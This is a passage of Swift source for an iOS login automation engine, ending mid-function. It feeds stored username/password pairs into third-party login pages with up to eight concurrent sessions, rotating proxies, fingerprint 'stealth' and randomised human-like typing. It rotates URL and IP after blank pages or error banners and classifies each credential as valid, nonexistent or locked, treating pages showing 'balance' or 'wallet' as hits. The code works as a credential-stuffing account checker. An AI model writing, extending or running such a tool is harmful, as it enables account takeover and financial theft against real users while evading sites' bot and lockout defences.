import Foundation
import UIKit
import WebKit

nonisolated enum LoginOutcome: Sendable {
    case success
    case permDisabled
    case tempDisabled
    case noAcc
    case unsure
    case connectionFailure
    case timeout
    case redBannerError
}

@MainActor
class LoginAutomationEngine {
    private var activeSessions: Int = 0
    let maxConcurrency: Int = 8
    var debugMode: Bool = false
    var stealthEnabled: Bool = false
    var automationSettings: AutomationSettings = AutomationSettings()
    var proxyTarget: ProxyRotationService.ProxyTarget = .joe
    private let logger = DebugLogger.shared
    private let visionML = VisionMLService.shared
    private let debugButtonService = DebugLoginButtonService.shared
    private let trueDetection = TrueDetectionService.shared
    private let networkFactory = NetworkSessionFactory.shared
    var onScreenshot: ((PPSRDebugScreenshot) -> Void)?
    var onPurgeScreenshots: (([String]) -> Void)?
    var onConnectionFailure: ((String) -> Void)?
    var onUnusualFailure: ((String) -> Void)?
    var onLog: ((String, PPSRLogEntry.Level) -> Void)?
    var onURLFailure: ((String) -> Void)?
    var onURLSuccess: ((String) -> Void)?
    var onResponseTime: ((String, TimeInterval) -> Void)?
    var onBlankScreenshot: ((String) -> Void)?

    var canStartSession: Bool {
        activeSessions < maxConcurrency
    }

    func runLoginTest(_ attempt: LoginAttempt, targetURL: URL, timeout: TimeInterval = 45) async -> LoginOutcome {
        activeSessions += 1
        defer { activeSessions -= 1 }

        let sessionId = "login_\(attempt.credential.username.prefix(12))_\(UUID().uuidString.prefix(6))"
        attempt.startedAt = Date()

        logger.startSession(sessionId, category: .login, message: "Starting login test for \(attempt.credential.username) → \(targetURL.host ?? targetURL.absoluteString)")
        logger.log("Config: timeout=\(Int(timeout))s stealth=\(stealthEnabled) activeSessions=\(activeSessions)/\(maxConcurrency)", category: .login, level: .debug, sessionId: sessionId, metadata: ["url": targetURL.absoluteString, "username": attempt.credential.username])

        let netConfig = networkFactory.nextConfig(for: proxyTarget)
        logger.log("Network config: \(netConfig.label) for target \(proxyTarget.rawValue)", category: .network, level: .info, sessionId: sessionId)
        attempt.logs.append(PPSRLogEntry(message: "Network: \(netConfig.label)", level: .info))

        let session = LoginSiteWebSession(targetURL: targetURL, networkConfig: netConfig)
        session.stealthEnabled = stealthEnabled
        session.onFingerprintLog = { [weak self] msg, level in
            attempt.logs.append(PPSRLogEntry(message: msg, level: level))
            self?.onLog?(msg, level)
            let debugLevel: DebugLogLevel = level == .error ? .error : level == .warning ? .warning : .trace
            self?.logger.log(msg, category: .fingerprint, level: debugLevel, sessionId: sessionId)
        }
        logger.log("WebView session setUp (wipeAll: true) network=\(netConfig.label)", category: .webView, level: .trace, sessionId: sessionId)
        session.setUp(wipeAll: true)
        defer {
            session.tearDown(wipeAll: true)
            logger.log("WebView session tearDown (wipeAll: true)", category: .webView, level: .trace, sessionId: sessionId)
        }

        logger.startTimer(key: sessionId)
        let outcome: LoginOutcome = await withTaskGroup(of: LoginOutcome.self) { group in
            group.addTask {
                return await self.performLoginTest(session: session, attempt: attempt, sessionId: sessionId)
            }

            group.addTask {
                try? await Task.sleep(for: .seconds(timeout))
                return .timeout
            }

            let first = await group.next() ?? .timeout
            group.cancelAll()
            return first
        }
        let totalMs = logger.stopTimer(key: sessionId)

        if outcome == .timeout {
            attempt.status = .failed
            attempt.errorMessage = "Test timed out after \(Int(timeout))s — auto-requeuing"
            attempt.completedAt = Date()
            attempt.logs.append(PPSRLogEntry(message: "TIMEOUT: Test exceeded \(Int(timeout))s limit", level: .warning))
            logger.log("TIMEOUT after \(Int(timeout))s for \(attempt.credential.username)", category: .login, level: .error, sessionId: sessionId, durationMs: totalMs)
            onUnusualFailure?("Timeout for \(attempt.credential.username) after \(Int(timeout))s")
        }

        if outcome == .connectionFailure {
            logger.log("CONNECTION FAILURE for \(attempt.credential.username) on \(targetURL.host ?? "")", category: .network, level: .error, sessionId: sessionId, durationMs: totalMs)
            onURLFailure?(targetURL.absoluteString)
            onUnusualFailure?("Connection failure for \(attempt.credential.username)")
        }

        if outcome == .success || outcome == .noAcc || outcome == .permDisabled || outcome == .tempDisabled {
            onURLSuccess?(targetURL.absoluteString)
        }

        if let started = attempt.startedAt {
            let responseTime = Date().timeIntervalSince(started)
            logger.log("Response time: \(Int(responseTime * 1000))ms on \(targetURL.host ?? "")", category: .timing, level: .debug, sessionId: sessionId, durationMs: Int(responseTime * 1000))
            onResponseTime?(targetURL.absoluteString, responseTime)
        }

        logger.endSession(sessionId, category: .login, message: "Login test COMPLETE: \(outcome) for \(attempt.credential.username)", level: outcome == .success ? .success : outcome == .noAcc ? .warning : .error)

        return outcome
    }

    private func performLoginTest(session: LoginSiteWebSession, attempt: LoginAttempt, sessionId: String = "") async -> LoginOutcome {
        advanceTo(.loadingPage, attempt: attempt, message: "Loading login page: \(session.targetURL.absoluteString)")
        logger.log("Phase: LOAD PAGE → \(session.targetURL.absoluteString)", category: .automation, level: .info, sessionId: sessionId)

        let preLoginURL = session.targetURL.absoluteString.lowercased()

        var loaded = false
        for attemptNum in 1...3 {
            logger.startTimer(key: "\(sessionId)_pageload_\(attemptNum)")
            loaded = await session.loadPage(timeout: 30)
            let loadMs = logger.stopTimer(key: "\(sessionId)_pageload_\(attemptNum)")
            if loaded {
                logger.log("Page load attempt \(attemptNum)/3 SUCCESS", category: .webView, level: .success, sessionId: sessionId, durationMs: loadMs)
                break
            }
            let errorDetail = session.lastNavigationError ?? "unknown error"
            logger.log("Page load attempt \(attemptNum)/3 FAILED: \(errorDetail)", category: .webView, level: .warning, sessionId: sessionId, durationMs: loadMs)
            attempt.logs.append(PPSRLogEntry(message: "Page load attempt \(attemptNum)/3 failed — \(errorDetail)", level: .warning))
            if attemptNum < 3 {
                let waitTime = Double(attemptNum) * 2
                attempt.logs.append(PPSRLogEntry(message: "Retrying in \(Int(waitTime))s...", level: .info))
                logger.log("Retry wait \(Int(waitTime))s before attempt \(attemptNum + 1)", category: .automation, level: .trace, sessionId: sessionId)
                try? await Task.sleep(for: .seconds(waitTime))
                if attemptNum == 2 {
                    logger.log("Full session reset before final attempt", category: .webView, level: .debug, sessionId: sessionId)
                    session.tearDown(wipeAll: true)
                    session.stealthEnabled = stealthEnabled
                    session.setUp(wipeAll: true)
                }
            }
        }

        guard loaded else {
            let errorDetail = session.lastNavigationError ?? "Unknown error"
            logger.log("FATAL: Page load failed after 3 attempts — \(errorDetail)", category: .network, level: .critical, sessionId: sessionId)
            failAttempt(attempt, message: "FATAL: Failed to load login page after 3 attempts — \(errorDetail)")
            onConnectionFailure?("Page load failed: \(errorDetail)")
            await captureDebugScreenshot(session: session, attempt: attempt, step: "page_load_failed", note: "Failed to load", autoResult: .unknown)
            return .connectionFailure
        }

        let pageTitle = await session.getPageTitle()
        attempt.logs.append(PPSRLogEntry(message: "Page loaded: \"\(pageTitle)\"", level: .info))
        logger.log("Page title: \"\(pageTitle)\"", category: .webView, level: .debug, sessionId: sessionId)

        if let initialScreenshot = await session.captureScreenshot(), BlankScreenshotDetector.isBlank(initialScreenshot) {
            attempt.logs.append(PPSRLogEntry(message: "BLANK PAGE after load — rotating URL & requeuing", level: .warning))
            logger.log("BLANK PAGE detected after load for \(attempt.credential.username) on \(session.targetURL.absoluteString)", category: .screenshot, level: .error, sessionId: sessionId)
            await captureDebugScreenshot(session: session, attempt: attempt, step: "blank_page_load", note: "BLANK PAGE on load — auto-retry with different URL & IP", autoResult: .unknown)
            attempt.status = .failed
            attempt.errorMessage = "Blank page on load — auto-retry with different URL & IP"
            attempt.completedAt = Date()
            onBlankScreenshot?(session.targetURL.absoluteString)
            onUnusualFailure?("Blank page for \(attempt.credential.username) on \(session.targetURL.host ?? "unknown") — rotating URL")
            return .connectionFailure
        }

        logger.startTimer(key: "\(sessionId)_cookies")
        await session.dismissCookieNotices()
        let cookieMs = logger.stopTimer(key: "\(sessionId)_cookies")
        attempt.logs.append(PPSRLogEntry(message: "Cookie/consent notices dismissed", level: .info))
        logger.log("Cookie notices dismissed", category: .webView, level: .trace, sessionId: sessionId, durationMs: cookieMs)
        try? await Task.sleep(for: .milliseconds(300))

        let preLoginContent = await session.getPageContent()
        logger.log("Pre-login content captured (\(preLoginContent.count) chars)", category: .webView, level: .trace, sessionId: sessionId)

        logger.startTimer(key: "\(sessionId)_fieldverify")
        let verification = await session.verifyLoginFieldsExist()
        let fieldMs = logger.stopTimer(key: "\(sessionId)_fieldverify")
        logger.log("Field verification: \(verification.found)/2 found", category: .automation, level: verification.found >= 2 ? .debug : .warning, sessionId: sessionId, durationMs: fieldMs, metadata: ["missing": verification.missing.joined(separator: ",")])
        if verification.found < 2 {
            attempt.logs.append(PPSRLogEntry(message: "Field scan: \(verification.found)/2 found. Missing: [\(verification.missing.joined(separator: ", "))]", level: .warning))
            if verification.found == 0 {
                attempt.logs.append(PPSRLogEntry(message: "Waiting 4s for JavaScript-rendered content...", level: .info))
                logger.log("No fields found — waiting 4s for JS render", category: .webView, level: .debug, sessionId: sessionId)
                try? await Task.sleep(for: .seconds(4))
                let retryVerification = await session.verifyLoginFieldsExist()
                logger.log("Retry field verification: \(retryVerification.found)/2", category: .automation, level: retryVerification.found > 0 ? .info : .error, sessionId: sessionId)
                if retryVerification.found == 0 {
                    failAttempt(attempt, message: "FATAL: No login fields found after extended wait")
                    await captureDebugScreenshot(session: session, attempt: attempt, step: "no_fields", note: "No login fields found", autoResult: .fail)
                    return .connectionFailure
                }
            }
        } else {
            attempt.logs.append(PPSRLogEntry(message: "Both login fields verified present and enabled", level: .success))
        }

        let humanEngine = HumanInteractionEngine.shared
        let patternLearning = LoginPatternLearning.shared
        let calibrationService = LoginCalibrationService.shared
        let targetURLString = session.targetURL.absoluteString

        var calibration = calibrationService.calibrationFor(url: targetURLString)
        if calibration == nil || !calibration!.isCalibrated {
            logger.log("No calibration — running auto-calibrate probe", category: .automation, level: .info, sessionId: sessionId)
            if let autoCal = await session.autoCalibrate() {
                calibrationService.saveCalibration(autoCal, forURL: targetURLString)
                calibration = autoCal
                attempt.logs.append(PPSRLogEntry(message: "Auto-calibrated: email=\(autoCal.emailField?.cssSelector ?? "nil") pass=\(autoCal.passwordField?.cssSelector ?? "nil") btn=\(autoCal.loginButton?.cssSelector ?? "nil")", level: .info))
                logger.log("Auto-calibration SUCCESS", category: .automation, level: .success, sessionId: sessionId)
            } else {
                attempt.logs.append(PPSRLogEntry(message: "Auto-calibration failed — trying Vision ML calibration", level: .warning))
                let visionCal = await visionCalibrateSession(session: session, forURL: targetURLString, sessionId: sessionId)
                if let visionCal {
                    calibrationService.saveCalibration(visionCal, forURL: targetURLString)
                    calibration = visionCal
                    attempt.logs.append(PPSRLogEntry(message: "Vision ML calibrated: confidence=\(String(format: "%.0f%%", visionCal.confidence * 100))", level: .success))
                } else {
                    attempt.logs.append(PPSRLogEntry(message: "Vision ML calibration also failed — using generic selectors", level: .warning))
                }
            }
        } else {
            attempt.logs.append(PPSRLogEntry(message: "Using saved calibration (confidence: \(String(format: "%.0f%%", calibration!.confidence * 100)))", level: .info))
        }

        let maxSubmitCycles = 4
        var finalOutcome: LoginOutcome = .noAcc
        var lastEvaluation: EvaluationResult?
        var usedPatterns: [LoginFormPattern] = []

        let priorityPatterns: [LoginFormPattern]
        if automationSettings.trueDetectionEnabled && automationSettings.trueDetectionPriority {
            priorityPatterns = [.trueDetection, .calibratedTyping, .calibratedDirect, .tabNavigation, .reactNativeSetter, .formSubmitDirect, .coordinateClick, .visionMLCoordinate, .clickFocusSequential, .execCommandInsert, .slowDeliberateTyper, .mobileTouchBurst]
        } else if calibration?.isCalibrated == true {
            priorityPatterns = [.calibratedTyping, .calibratedDirect, .trueDetection, .tabNavigation, .reactNativeSetter, .formSubmitDirect, .coordinateClick, .visionMLCoordinate, .clickFocusSequential, .execCommandInsert, .slowDeliberateTyper, .mobileTouchBurst]
        } else {
            priorityPatterns = [.trueDetection, .tabNavigation, .reactNativeSetter, .visionMLCoordinate, .formSubmitDirect, .clickFocusSequential, .execCommandInsert, .slowDeliberateTyper, .mobileTouchBurst, .calibratedDirect, .coordinateClick, .calibratedTyping]
        }

        for cycle in 1...maxSubmitCycles {
            logger.log("Phase: HUMAN PATTERN CYCLE \(cycle)/\(maxSubmitCycles)", category: .automation, level: .info, sessionId: sessionId)
            logger.startTimer(key: "\(sessionId)_cycle_\(cycle)")

            let selectedPattern: LoginFormPattern
            if cycle == 1 {
                if automationSettings.trueDetectionEnabled {
                    selectedPattern = .trueDetection
                } else {
                    selectedPattern = humanEngine.selectBestPattern(for: targetURLString)
                }
            } else {
                let remaining = priorityPatterns.filter { !usedPatterns.contains($0) }
                selectedPattern = remaining.first ?? LoginFormPattern.allCases.filter { !usedPatterns.contains($0) }.randomElement() ?? LoginFormPattern.allCases.randomElement()!
            }
            usedPatterns.append(selectedPattern)

            advanceTo(.fillingCredentials, attempt: attempt, message: "Cycle \(cycle)/\(maxSubmitCycles) — using pattern: \(selectedPattern.rawValue)")
            attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): selected pattern '\(selectedPattern.rawValue)' — \(selectedPattern.description)", level: .info))

            if cycle > 1 {
                let buttonCheck = await session.checkLoginButtonReadiness()
                if !buttonCheck.isReady {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): login button not ready (\(buttonCheck.detail)) — waiting up to 15s", level: .warning))
                    let waitResult = await session.waitForLoginButtonReady(timeout: 15)
                    if waitResult.timedOut {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): login button hung — requeuing", level: .warning))
                        attempt.status = .failed
                        attempt.errorMessage = "Login button hung in loading state — requeued"
                        attempt.completedAt = Date()
                        await captureDebugScreenshot(session: session, attempt: attempt, step: "button_hung", note: "Login button stuck in translucent/loading state", autoResult: .unknown)
                        return .unsure
                    }
                }
                try? await Task.sleep(for: .milliseconds(Int.random(in: 500...1500)))
            }

            await session.dismissCookieNotices()
            try? await Task.sleep(for: .milliseconds(Int.random(in: 200...600)))

            logger.startTimer(key: "\(sessionId)_pattern_\(cycle)")
            let patternResult = await session.executeHumanPattern(
                selectedPattern,
                username: attempt.credential.username,
                password: attempt.credential.password,
                sessionId: sessionId
            )
            let patternMs = logger.stopTimer(key: "\(sessionId)_pattern_\(cycle)")

            attempt.logs.append(PPSRLogEntry(
                message: "Cycle \(cycle) pattern result: \(patternResult.summary)",
                level: patternResult.overallSuccess ? .success : .warning
            ))
            logger.log("Pattern '\(selectedPattern.rawValue)' result: \(patternResult.summary)", category: .automation, level: patternResult.overallSuccess ? .success : .warning, sessionId: sessionId, durationMs: patternMs)

            if !patternResult.usernameFilled || !patternResult.passwordFilled {
                attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): field fill failed — clearing fields then falling back to calibrated+legacy fill", level: .warning))
                await session.clearAllInputFields()
                try? await Task.sleep(for: .milliseconds(200))
                let calUserResult = await session.fillUsernameCalibrated(attempt.credential.username, calibration: calibration)
                attempt.logs.append(PPSRLogEntry(message: "Calibrated email fill: \(calUserResult.detail)", level: calUserResult.success ? .info : .warning))
                try? await Task.sleep(for: .milliseconds(300))
                let calPassResult = await session.fillPasswordCalibrated(attempt.credential.password, calibration: calibration)
                attempt.logs.append(PPSRLogEntry(message: "Calibrated password fill: \(calPassResult.detail)", level: calPassResult.success ? .info : .warning))
                try? await Task.sleep(for: .milliseconds(400))
            }

            advanceTo(.submitting, attempt: attempt, message: "Cycle \(cycle)/\(maxSubmitCycles) — evaluating submit...")

            if !patternResult.submitTriggered {
                attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): pattern submit failed — trying debug button → calibrated → legacy click strategies", level: .warning))
                var legacySubmitOK = false

                let debugBtnResult = await debugButtonService.replaySuccessfulMethod(session: session, url: targetURLString)
                if debugBtnResult.success {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) DEBUG BUTTON REPLAY: \(debugBtnResult.detail)", level: .success))
                    logger.log("DebugLoginButton replay SUCCESS for \(targetURLString)", category: .automation, level: .success, sessionId: sessionId)
                    legacySubmitOK = true
                } else if debugButtonService.hasSuccessfulMethod(for: targetURLString) {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) debug button replay failed: \(debugBtnResult.detail)", level: .warning))
                }

                if !legacySubmitOK {
                    let calClickResult = await session.clickLoginButtonCalibrated(calibration: calibration)
                    if calClickResult.success {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) calibrated click: \(calClickResult.detail)", level: .info))
                        legacySubmitOK = true
                    }
                }

                if !legacySubmitOK {
                    for submitAttempt in 1...3 {
                        let clickResult = await session.clickLoginButton()
                        if clickResult.success {
                            attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) legacy click attempt \(submitAttempt): \(clickResult.detail)", level: .info))
                            legacySubmitOK = true
                            break
                        }
                        if submitAttempt < 3 {
                            try? await Task.sleep(for: .seconds(Double(submitAttempt)))
                        }
                    }
                }
                if !legacySubmitOK {
                    let ocrResult = await session.ocrClickLoginButton()
                    if ocrResult.success {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) OCR click: \(ocrResult.detail)", level: .info))
                        legacySubmitOK = true
                    }
                }
                if !legacySubmitOK {
                    let visionResult = await visionClickLoginButton(session: session, sessionId: sessionId)
                    if visionResult {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) Vision ML click: found and clicked login button via screenshot OCR", level: .success))
                        legacySubmitOK = true
                    }
                }
                if !legacySubmitOK && cycle == 1 {
                    patternLearning.recordAttempt(url: targetURLString, pattern: selectedPattern, fillSuccess: patternResult.usernameFilled && patternResult.passwordFilled, submitSuccess: false, loginOutcome: "submit_failed", responseTimeMs: patternMs ?? 0, submitMethod: patternResult.submitMethod)
                    failAttempt(attempt, message: "LOGIN SUBMIT FAILED after pattern + legacy attempts")
                    await captureDebugScreenshot(session: session, attempt: attempt, step: "submit_failed", note: "All submit strategies failed", autoResult: .fail)
                    return .connectionFailure
                }
                if !legacySubmitOK {
                    patternLearning.recordAttempt(url: targetURLString, pattern: selectedPattern, fillSuccess: patternResult.usernameFilled && patternResult.passwordFilled, submitSuccess: false, loginOutcome: "submit_failed", responseTimeMs: patternMs ?? 0, submitMethod: patternResult.submitMethod)
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) all submit methods failed — skipping to next cycle", level: .warning))
                    continue
                }
            }

            let preSubmitURL = await session.getCurrentURL()
            attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): waiting up to 5s for response...", level: .info))

            logger.startTimer(key: "\(sessionId)_poll_\(cycle)")
            let pollResult = await session.rapidWelcomePoll(timeout: 5, originalURL: preSubmitURL)
            let pollMs = logger.stopTimer(key: "\(sessionId)_poll_\(cycle)")
            logger.log("Rapid poll complete: welcome=\(pollResult.welcomeTextFound) redirect=\(pollResult.redirectedToHomepage) nav=\(pollResult.navigationDetected) banner=\(pollResult.errorBannerDetected)", category: .automation, level: .debug, sessionId: sessionId, durationMs: pollMs)

            advanceTo(.evaluatingResult, attempt: attempt, message: "Cycle \(cycle)/\(maxSubmitCycles) — evaluating response...")

            var pageContent = pollResult.finalPageContent
            if pageContent.isEmpty {
                pageContent = await session.getPageContent()
            }
            var currentURL = pollResult.finalURL
            if currentURL.isEmpty {
                currentURL = await session.getCurrentURL()
            }
            attempt.detectedURL = currentURL
            attempt.responseSnippet = String(pageContent.prefix(500))

            let screenshotImage: UIImage?
            if let ws = pollResult.welcomeScreenshot {
                screenshotImage = ws
            } else {
                screenshotImage = await session.captureScreenshot()
            }
            attempt.responseSnapshot = screenshotImage

            if let img = screenshotImage, BlankScreenshotDetector.isBlank(img) {
                attempt.logs.append(PPSRLogEntry(message: "BLANK SCREENSHOT detected on cycle \(cycle) — requeuing with different URL/IP", level: .warning))
                logger.log("BLANK SCREENSHOT detected for \(attempt.credential.username) on \(session.targetURL.absoluteString)", category: .screenshot, level: .error, sessionId: sessionId)
                await captureDebugScreenshot(session: session, attempt: attempt, step: "blank_screenshot", note: "BLANK PAGE — auto-retry with different URL & IP", autoResult: .unknown)
                attempt.status = .failed
                attempt.errorMessage = "Blank screenshot — auto-retry with different URL & IP"
                attempt.completedAt = Date()
                onBlankScreenshot?(session.targetURL.absoluteString)
                onUnusualFailure?("Blank screenshot for \(attempt.credential.username) on \(session.targetURL.host ?? "") — rotating URL")
                return .connectionFailure
            }

            let welcomeTextFound = pollResult.welcomeTextFound
            let welcomeContext = pollResult.welcomeContext

            attempt.logs.append(PPSRLogEntry(
                message: "Welcome! rapid poll: \(welcomeTextFound ? "FOUND — \(welcomeContext ?? "")" : "NOT FOUND")",
                level: welcomeTextFound ? .success : .info
            ))
            attempt.logs.append(PPSRLogEntry(
                message: "Redirect check: \(pollResult.redirectedToHomepage ? "REDIRECTED to homepage" : "still on login page") | URL: \(currentURL)",
                level: pollResult.redirectedToHomepage ? .success : .info
            ))

            if pollResult.errorBannerDetected {
                attempt.logs.append(PPSRLogEntry(
                    message: "RED BANNER ERROR detected: \(pollResult.errorBannerText ?? "error") — wiping session, requeuing to bottom",
                    level: .warning
                ))
                await captureTerminalScreenshot(session: session, attempt: attempt, step: "red_banner_error", note: "RED BANNER ERROR: \(pollResult.errorBannerText ?? "error") — requeued for future retry", autoResult: .unknown, terminalType: .errorBanner)
                attempt.status = .failed
                attempt.errorMessage = "Red banner error detected — requeuing to bottom"
                attempt.completedAt = Date()
                return .redBannerError
            }

            logger.startTimer(key: "\(sessionId)_eval_\(cycle)")
            let evaluation = evaluateLoginResponse(
                pageContent: pageContent,
                currentURL: currentURL,
                preLoginURL: preLoginURL,
                pageTitle: await session.getPageTitle(),
                welcomeTextFound: welcomeTextFound,
                redirectedToHomepage: pollResult.redirectedToHomepage,
                navigationDetected: pollResult.navigationDetected,
                contentChanged: pollResult.anyContentChange
            )
            let _ = logger.stopTimer(key: "\(sessionId)_eval_\(cycle)")
            lastEvaluation = evaluation
            let cycleMs = logger.stopTimer(key: "\(sessionId)_cycle_\(cycle)")
            logger.log("Cycle \(cycle) evaluation: \(evaluation.outcome) score=\(evaluation.score) signals=\(evaluation.signals.count) — \(evaluation.reason)", category: .evaluation, level: evaluation.outcome == .success ? .success : .info, sessionId: sessionId, durationMs: cycleMs, metadata: ["score": "\(evaluation.score)", "outcome": "\(evaluation.outcome)", "signalCount": "\(evaluation.signals.count)"])
            for signal in evaluation.signals {
                logger.log("  Signal: \(signal)", category: .evaluation, level: .trace, sessionId: sessionId)
            }

            let autoResult: PPSRDebugScreenshot.AutoDetectedResult
            switch evaluation.outcome {
            case .success: autoResult = .pass
            case .noAcc, .permDisabled, .tempDisabled: autoResult = .fail
            default: autoResult = .unknown
            }

            await captureAlwaysScreenshot(session: session, attempt: attempt, cycle: cycle, maxCycles: maxSubmitCycles, welcomeTextFound: welcomeTextFound, redirected: pollResult.redirectedToHomepage, evaluationReason: evaluation.reason, currentURL: currentURL, autoResult: autoResult)

            attempt.logs.append(PPSRLogEntry(
                message: "Cycle \(cycle) evaluation: \(evaluation.outcome) (score: \(evaluation.score), signals: \(evaluation.signals.count)) — \(evaluation.reason)",
                level: evaluation.outcome == .success ? .success : evaluation.outcome == .noAcc ? .warning : .error
            ))

            let outcomeStr: String
            switch evaluation.outcome {
            case .success: outcomeStr = "success"
            case .tempDisabled: outcomeStr = "tempDisabled"
            case .permDisabled: outcomeStr = "permDisabled"
            case .noAcc: outcomeStr = "noAcc"
            default: outcomeStr = "unsure"
            }
            patternLearning.recordAttempt(
                url: targetURLString,
                pattern: selectedPattern,
                fillSuccess: patternResult.usernameFilled && patternResult.passwordFilled,
                submitSuccess: patternResult.submitTriggered || true,
                loginOutcome: outcomeStr,
                responseTimeMs: cycleMs ?? 0,
                submitMethod: patternResult.submitMethod
            )

            switch evaluation.outcome {
            case .success:
                advanceTo(.completed, attempt: attempt, message: "LOGIN SUCCESS on cycle \(cycle) via pattern '\(selectedPattern.rawValue)' — \(evaluation.reason)")
                attempt.completedAt = Date()
                return .success

            case .tempDisabled:
                attempt.logs.append(PPSRLogEntry(message: "TEMP DISABLED on cycle \(cycle): \(evaluation.reason) — FINAL RESULT", level: .warning))
                failAttempt(attempt, message: "Account temporarily disabled: \(evaluation.reason)")
                await captureTerminalScreenshot(session: session, attempt: attempt, step: "temp_disabled", note: "TEMP DISABLED: \(evaluation.reason)", autoResult: .fail, terminalType: .temporarilyDisabled)
                return .tempDisabled

            case .permDisabled:
                attempt.logs.append(PPSRLogEntry(message: "PERM DISABLED on cycle \(cycle): \(evaluation.reason) — FINAL RESULT (immediate)", level: .error))
                failAttempt(attempt, message: "Account permanently disabled/blacklisted: \(evaluation.reason)")
                await captureTerminalScreenshot(session: session, attempt: attempt, step: "perm_disabled", note: "PERM DISABLED: \(evaluation.reason)", autoResult: .fail, terminalType: .accountDisabled)
                return .permDisabled

            case .noAcc:
                if cycle < maxSubmitCycles {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): no account — retrying (\(maxSubmitCycles - cycle) cycles left)", level: .warning))
                    finalOutcome = .noAcc
                    try? await Task.sleep(for: .seconds(Double(cycle) * 1.5))
                } else {
                    finalOutcome = .noAcc
                }

            default:
                if cycle < maxSubmitCycles {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): no clear result — retrying (\(maxSubmitCycles - cycle) cycles left)", level: .warning))
                    try? await Task.sleep(for: .seconds(Double(cycle) * 1.5))
                }
                finalOutcome = .noAcc
            }
        }

        let eval = lastEvaluation
        switch finalOutcome {
        case .success:
            advanceTo(.completed, attempt: attempt, message: "LOGIN SUCCESS — \(eval?.reason ?? "confirmed")")
            attempt.completedAt = Date()
            return .success

        case .permDisabled:
            attempt.logs.append(PPSRLogEntry(message: "PERM DISABLED after \(maxSubmitCycles) cycles: \(eval?.reason ?? "unknown")", level: .error))
            failAttempt(attempt, message: "Account permanently disabled/blacklisted: \(eval?.reason ?? "unknown")")
            return .permDisabled

        case .tempDisabled:
            attempt.logs.append(PPSRLogEntry(message: "TEMP DISABLED after \(maxSubmitCycles) cycles: \(eval?.reason ?? "unknown")", level: .warning))
            failAttempt(attempt, message: "Account temporarily disabled: \(eval?.reason ?? "unknown")")
            return .tempDisabled

        case .noAcc:
            attempt.logs.append(PPSRLogEntry(message: "NO ACC after \(maxSubmitCycles) cycles: \(eval?.reason ?? "unknown")", level: .error))
            failAttempt(attempt, message: "No account found after \(maxSubmitCycles) attempts: \(eval?.reason ?? "unknown")")
            return .noAcc

        default:
            attempt.logs.append(PPSRLogEntry(message: "NO ACC after \(maxSubmitCycles) cycles (ambiguous fail assumed no account): \(eval?.reason ?? "unknown")", level: .error))
            failAttempt(attempt, message: "No account — ambiguous result defaulted to no acc after \(maxSubmitCycles) attempts")
            return .noAcc
        }
    }

    // MARK: - Weighted Multi-Signal Evaluation

    private struct EvaluationResult {
        let outcome: LoginOutcome
        let score: Int
        let reason: String
        let signals: [String]
    }

    private func evaluateLoginResponse(
        pageContent: String,
        currentURL: String,
        preLoginURL: String,
        pageTitle: String,
        welcomeTextFound: Bool,
        redirectedToHomepage: Bool,
        navigationDetected: Bool,
        contentChanged: Bool
    ) -> EvaluationResult {
        let contentLower = pageContent.lowercased()
        let urlLower = currentURL.lowercased()

        var successScore: Int = 0
        var incorrectScore: Int = 0
        var disabledScore: Int = 0
        var successSignals: [String] = []
        var incorrectSignals: [String] = []
        var disabledSignals: [String] = []

        // --- SUCCESS: TRUE DETECTION markers (balance, wallet, my account, logout) OR homepage redirect ---
        // CRITICAL: "welcome" is NOT a valid success indicator per TRUE DETECTION protocol

        let trueDetectionSuccessMarkers = ["balance", "wallet", "my account", "logout"]
        for marker in trueDetectionSuccessMarkers {
            if contentLower.contains(marker) {
                successScore += 100
                successSignals.append("+100 TRUE DETECTION marker '\(marker)' found")
                break
            }
        }

        if welcomeTextFound {
            successScore += 40
            successSignals.append("+40 'Welcome!' text (secondary indicator only)")
        }

        if redirectedToHomepage && !urlLower.contains("/login") && !urlLower.contains("/signin") {
            successScore += 80
            successSignals.append("+80 redirected away from login to homepage")
        }

        // --- INCORRECT signals (wrong credentials) ---

        let strongIncorrectTerms: [(String, Int)] = [
            ("incorrect password", 50), ("incorrect email", 50),
            ("invalid credentials", 50), ("wrong password", 50),
            ("invalid email or password", 55), ("incorrect username or password", 55),
            ("authentication failed", 45), ("login failed", 40),
            ("invalid login", 45), ("credentials are incorrect", 50),
            ("does not match", 40), ("not recognized", 40),
            ("no account found", 45), ("account not found", 45),
            ("email not found", 45), ("user not found", 45),
            ("please check your", 35), ("not valid", 30),
        ]
        for (term, weight) in strongIncorrectTerms {
            if contentLower.contains(term) {
                incorrectScore += weight
                incorrectSignals.append("+\(weight) '\(term)'")
            }
        }

        let weakIncorrectTerms: [(String, Int)] = [
            ("try again", 15), ("please try again", 20),
            ("invalid email", 20), ("invalid password", 20),
            ("check your credentials", 25), ("unable to log in", 25),
            ("login error", 20), ("sign in error", 20),
            ("error", 5),
        ]
        for (term, weight) in weakIncorrectTerms {
            if contentLower.contains(term) {
                incorrectScore += weight
                incorrectSignals.append("+\(weight) '\(term)'")
            }
        }

        if urlLower.contains("/login") || urlLower.contains("/signin") {
            if contentChanged && incorrectScore > 0 {
                incorrectScore += 10
                incorrectSignals.append("+10 still on login page with error content")
            }
            if !welcomeTextFound && !redirectedToHomepage {
                incorrectScore += 5
                incorrectSignals.append("+5 still on login URL without Welcome! or redirect")
            }
        }

        // --- DISABLED signals (blocked/banned) ---

        var temporarilyLocked = false
        let tempLockTerms = [
            "temporarily", "temporary lock", "temporarily locked",
            "temporarily disabled", "temporarily suspended",
            "temporarily blocked", "too many attempts",
            "too many login attempts", "too many failed",
            "try again later", "try again in", "account temporarily",
            "locked for", "wait before", "exceeded login attempts",
            "multiple failed attempts", "login attempts exceeded",
        ]
        for term in tempLockTerms {
